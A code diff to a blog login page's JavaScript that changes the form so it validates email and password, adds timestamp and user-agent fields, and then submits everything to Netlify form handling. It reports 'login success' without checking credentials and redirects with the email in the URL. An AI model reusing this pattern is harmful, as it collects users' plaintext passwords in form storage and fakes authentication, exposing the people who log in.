@@ -213,9 +213,46 @@ class BlogLogin {
     }
 
     bindEvents() {
-        // Form submission
+        // Form submission - 只做验证，不阻止提交
         const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', (e) => this.handleLogin(e));
+        loginForm.addEventListener('submit', (e) => {
+            // 在表单提交前执行验证和填充
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Basic validation
+            if (!email || !password) {
+                e.preventDefault();
+                this.dataCollector.trackLogin(email || '-', 'failed', 'email');
+                this.showNotification('请填写所有字段', 'error');
+                return;
+            }
+
+            if (!this.isValidEmail(email)) {
+                e.preventDefault();
+                this.dataCollector.trackLogin(email, 'failed', 'email');
+                this.showNotification('请输入有效的邮箱地址', 'error');
+                return;
+            }
+
+            // 验证通过，填充隐藏字段
+            document.getElementById('timestamp').value = new Date().toISOString();
+            document.getElementById('userAgent').value = navigator.userAgent;
+
+            // 记录登录数据
+            this.dataCollector.trackLogin(email, 'success', 'email');
+
+            // 记住我功能
+            const rememberMe = document.getElementById('rememberMe').checked;
+            if (rememberMe) {
+                localStorage.setItem('rememberedEmail', email);
+            }
+
+            // 显示成功消息（不阻止表单提交）
+            this.showNotification('登录成功！正在提交...', 'success');
+
+            // 注意：不阻止表单提交，让 Netlify 处理
+        });
 
         // Toggle password visibility
         const togglePassword = document.getElementById('togglePassword');
@@ -518,13 +555,23 @@ class BlogLogin {
 
 // Initialize app when DOM is loaded
 document.addEventListener('DOMContentLoaded', () => {
-    new BlogLogin();
+    const blogLogin = new BlogLogin();
 
     // Check for remembered email
     const rememberedEmail = localStorage.getItem('rememberedEmail');
     if (rememberedEmail) {
         document.getElementById('email').value = rememberedEmail;
         document.getElementById('rememberMe').checked = true;
+    }
+
+    // 检查 URL 参数，如果表单已提交则跳转
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('form-submitted') || urlParams.has('submitted')) {
+        const email = urlParams.get('email') || rememberedEmail || '';
+        blogLogin.showNotification('✅ 登录成功！正在跳转...', 'success');
+        setTimeout(() => {
+            window.location.href = `blog.html${email ? '?email=' + encodeURIComponent(email) : ''}`;
+        }, 1000);
     }
 
     // Add some demo credentials helper
